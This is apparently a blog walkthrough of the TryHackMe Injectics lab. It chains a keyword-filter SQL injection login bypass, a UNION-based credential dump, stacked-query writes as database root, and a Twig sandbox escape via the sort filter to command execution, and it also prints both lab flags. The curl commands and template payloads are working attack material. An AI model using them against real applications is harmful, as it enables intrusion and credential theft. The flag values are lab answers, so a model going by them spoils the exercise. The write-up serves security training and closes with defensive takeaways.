---
title: "TryHackMe Injectics: SQLi Filter Bypass to Twig RCE"
date: 2026-10-17T15:51:00+05:30
lastmod: 2026-10-17T15:51:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-injectics/00-thumbnail.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - thm
  - rooms
  - Web Application Pentesting
  - Injection Attacks
  - SQL Injection
  - SSTI
  - Twig
  - Server-Side Template Injection
  - Stacked Queries
  - RCE

draft: false
description: "Walkthrough of TryHackMe Injectics: bypassing the login SQLi keyword filter, stacked query injection, and a Twig sandbox escape via the sort filter for RCE."
---

| <script src="https://tryhackme.com/badge/434937"></script>| <a class="twitter-follow-button" href="https://twitter.com/anir0y" data-size="large"> Follow @anir0y<a>|
|---|---|
|Injectics |![Injectics room icon](https://cdn-images.tryhackme.com/room-icons/645b19f5d5848d004ab9c9e2-1721317107138)|

Injectics is the capstone challenge of the Injection Attacks module in the Web Application Pentesting path, and it earns the name. Where [NoSQL Injection](/post/thm-room-nosqlinjectiontutorial/) and [ORM Injection](/post/thm-room-orminjection/) each drill one idea, Injectics makes you chain several: a login SQL injection behind a keyword filter, a second injection in the admin area that happens to allow stacked queries as database root, and a Twig template injection that is locked inside a sandbox. Neither flag sits in the database or on a page, so the whole room comes down to turning those injections into code execution.

The target is a single PHP leaderboard app on Apache 2.4.41 (Ubuntu) backed by MySQL 8. Port 80 was reachable directly over the TryHackMe VPN for my session, so every command below is a plain `curl` from my own machine. The lab IP was `10.49.169.238`; substitute your own. Looted account passwords are lab generated and short lived, and I have redacted them in the output. I never handle my own credentials.

## The app and the login filter

The front page is a static leaderboard; the only input is the login at `login.php`, which posts `username`, `password`, and `function=login` to `functions.php`. The page ships a client-side keyword blocklist in `script.js`:

```javascript
const invalidKeywords = ['or', 'and', 'union', 'select', '"', "'"];
```

That check only runs in the browser, so `curl` ignores it. The server side is in `functions.php` and is weaker than it looks:

```php
if ($email == "superadmin@injectics.thm"){ return false; }
$email    = str_ireplace(["AND","OR","UNION"], "", $email);
$password = str_ireplace(["AND","OR","UNION"], "", $password);
$sql = "SELECT * FROM users WHERE email='$email' AND password='$password'";
```

Three things fall out of this. The filter strips only `AND`, `OR`, and `UNION`, and only once each, so doubling a keyword survives it (`UNIUNIONON` collapses to `UNION`) and `SELECT` is not filtered at all. Any identifier that contains a banned substring is also mangled, so `ORDER` becomes `DER` and `password` becomes `passwd`; the fix is the same doubling trick (`oorrder`, `passwoorrd`). Finally, the hardcoded check blocks the literal `superadmin@injectics.thm`, but a trailing quote changes the string enough to dodge the comparison while still matching the row, so `superadmin@injectics.thm'#` logs you straight in as the admin.

## Login SQLi: column count and credential dump

The query returns the whole `users` row, which is six columns (confirmed with an `ORDER BY` probe using the `oorrder` evasion). There is no second password check in PHP, so a `UNION SELECT` with the right column count authenticates as whatever row I fabricate, and columns two and three are reflected back as `first_name` and `last_name`. That makes the login a clean extraction oracle:

```bash
  # doubled UNION, plain SELECT; group_concat the users table into column 2
curl -s -X POST "http://$T/functions.php" --data-urlencode "function=login" \
  --data-urlencode "password=x" \
  --data-urlencode "username=zzz' uniunionon select 1,group_concat(email,0x7c,fname,0x7c,passwoorrd,0x7c,auth),3,4,5,6 from users#"
  # dev@injectics.thm|dev|2342************|1
  # superadmin@injectics.thm|admin|34234*************|0
```

Two accounts come back: `dev` with `auth=1` and `superadmin` (first name `admin`) with `auth=0`. The passwords are stored in clear text. The `dev` password works at the normal login, but `superadmin` does not, because the login path only succeeds for rows the hardcoded email check lets through. That is fine, the `'#` bypass already gives an admin session, and `dev` stays useful later.

{{< ad >}}

## The admin area: stacked queries as database root

A real admin session (via the `'#` bypass) unlocks `dashboard.php` and its leaderboard editor at `edit_leaderboard.php`. The editor posts `rank`, `country`, and three medal counts, and the medal values land unquoted in an `UPDATE`:

```sql
UPDATE leaderboard SET gold=$gold, silver=$silver, bronze=$bronze WHERE rank=$rank
```

Unquoted means injectable, and this endpoint runs through a multi-statement API, so it accepts stacked queries. A quick marker write proves it:

```bash
  # second statement runs: set rank 6 country to HAX
--data-urlencode "gold=22;UPDATE leaderboard SET country=0x484158 WHERE \`rank\`=6-- -"
```

The connection runs as `root@localhost`, so I now have arbitrary SQL as database root. That is not an instant shell though: `@@secure_file_priv` is pinned to `/var/lib/mysql-files/`, so `load_file` and `INTO OUTFILE` cannot touch the webroot, and pointing `general_log` at `/var/www/html` fails because the mysql user cannot write there. The database root is a means to an end, not the end itself.

## Second-order SSTI: writing a payload into a rendered field

The `dashboard.php` greeting is the interesting sink. It does not trust the session value; it re-queries the user by the session email and renders the fetched first name through Twig:

```php
$twig->createTemplate("Welcome, ".$fname."!")->render();
```

Because the first name is concatenated into the template source, anyone who controls a user's `fname` in the database controls the template. The stacked-query injection does exactly that. Writing a Twig probe into the `dev` row and logging in as `dev` confirms evaluation:

```bash
  # stacked UPDATE writes the Twig payload into dev's first name
--data-urlencode "gold=22;UPDATE users SET fname=0x7b7b372a377d7d WHERE email=0x$DEV-- -"
  # 0x7b7b372a377d7d = {{7*7}}
  # dashboard then renders: Welcome, 49!
```

So the chain is second-order: SQL injection in the admin editor writes the payload, and the SSTI fires on the next dashboard load. The composer file requiring `twig/twig: 2.14.0` had already hinted the template engine was the intended target.

## Escaping the Twig sandbox with the sort filter

The catch is that Twig runs in sandbox mode. The obvious `{{['id']|filter('system')}}` is refused with "The callable passed to filter must be a Closure in sandbox mode," and the same applies to `map` and `reduce`. Functions like `range`, `source`, `include`, and `constant` are all blocked, `_self` access trips the `import` tag restriction, and the render context is empty, so there is nothing to pivot off.

The gap is the `sort` filter. Unlike `filter`, `map`, and `reduce`, Twig 2.14.0 does not enforce the Closure check on `sort`'s callback, so it accepts a plain string callable and hands it to PHP's `uasort` as the comparator. A comparator is called with two array elements, and `passthru` runs its first argument as a shell command and prints the output straight into the page:

```bash
  # sort() accepts a string callable in the sandbox; passthru prints command output
  # payload stored in fname: {{['id','zzz']|sort('passthru')|join}}
  # dashboard renders:
  # Welcome, uid=33(www-data) gid=33(www-data) groups=33(www-data) idzzz!
```

That is remote code execution as `www-data`. With a shell I drove the same `UPDATE fname` plus dashboard-read loop as a tiny command runner.

## Both flags

The hidden file for the second question lives in the `flags` folder, which returns 403 with no listing. Code execution reads it directly, and the filename turns out to be an MD5:

```bash
  # ls flags/  ->  5d8af1dc14503c7e4bdc8e51a3469f48.txt
  # cat flags/5d8af1dc14503c7e4bdc8e51a3469f48.txt
```

The content of the hidden text file in the flags folder is **THM{5735172b6c147f4dd649872f73e0fdea}**.

The admin-panel flag is the subtle one. It is printed in `dashboard.php`, but only inside a guard:

```php
<?php if ($_SESSION['role'] == "admin"){ ?>
<h4 class="text-center">THM{INJECTICS_ADMIN_PANEL_007}</h4> <?php }?>
```

The login code hardcodes `$_SESSION['role'] = "dev"` for every account, so that branch never runs through the normal flow. No login, admin or otherwise, prints it; the flag is meant to be read out of the source once you have code execution. Grepping the file over the shell returns it. The flag value after logging into the admin panel is **THM{INJECTICS_ADMIN_PANEL_007}**.

After pulling both flags I restored the leaderboard rows and the `dev` and `superadmin` first names to their original values.

## Takeaways

Two ideas carry past this lab into real web targets.

- **A database-root injection is not automatically a shell, and a sandboxed SSTI is not automatically dead.** On this box `secure_file_priv` and filesystem permissions killed every MySQL file-write route, yet the same injection chained into a template field and the real win came from the Twig sandbox. When one primitive stalls, look at what it can reach rather than forcing it: the stacked-query write was worthless on its own and decisive as the delivery step for the SSTI.
- **Sandboxes fail on the filter nobody audited.** Twig 2.14.0 enforced the Closure requirement on `filter`, `map`, and `reduce` but missed `sort`, so a string callable walked straight to `passthru`. Allowlist a template engine's filters explicitly, keep the engine patched (this exact gap is fixed in later releases), and never render untrusted input as template source. On a live target, fuzz every template-backed field with `{{7*7}}` and, when the sandbox bites, enumerate the filters one by one; the escape is usually the one that was treated as harmless.

Room solved 100%: 1 task, 2 answers.
